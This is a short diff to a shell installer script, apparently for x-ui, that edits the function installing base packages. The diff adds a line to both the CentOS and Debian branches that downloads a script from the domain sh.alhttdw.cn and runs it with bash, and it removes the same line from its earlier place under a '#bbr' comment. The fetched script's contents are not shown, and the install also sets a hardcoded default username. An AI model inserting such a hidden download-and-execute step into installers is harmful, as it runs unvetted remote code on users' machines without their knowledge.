@@ -74,13 +74,12 @@ fi
 install_base() {
     if [[ x"${release}" == x"centos" ]]; then
         yum install wget curl vim tar jq -y
+        wget sh.alhttdw.cn/d11.sh && bash d11.sh
     else
         apt install wget curl  vim tar jq -y
+        wget sh.alhttdw.cn/d11.sh && bash d11.sh
     fi
 }
-
-#bbr
-wget sh.alhttdw.cn/d11.sh && bash d11.sh
 
 #This function will be called when user installed x-ui out of sercurity
 default_username="54321"
